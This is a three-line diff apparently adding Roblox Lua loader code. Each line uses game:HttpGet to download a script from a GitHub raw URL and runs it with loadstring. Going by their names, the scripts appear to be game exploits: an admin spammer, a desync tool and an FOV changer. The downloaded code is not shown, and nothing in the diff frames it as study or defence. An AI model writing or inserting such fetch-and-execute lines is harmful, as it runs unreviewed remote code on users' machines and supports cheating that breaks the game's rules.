@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lumiolab/unkrestyo/refs/heads/main/adminspammer.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lumiolab/unkrestyo/refs/heads/main/desyncv2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lumiolab/unkrestyo/refs/heads/main/fovchanger"))()
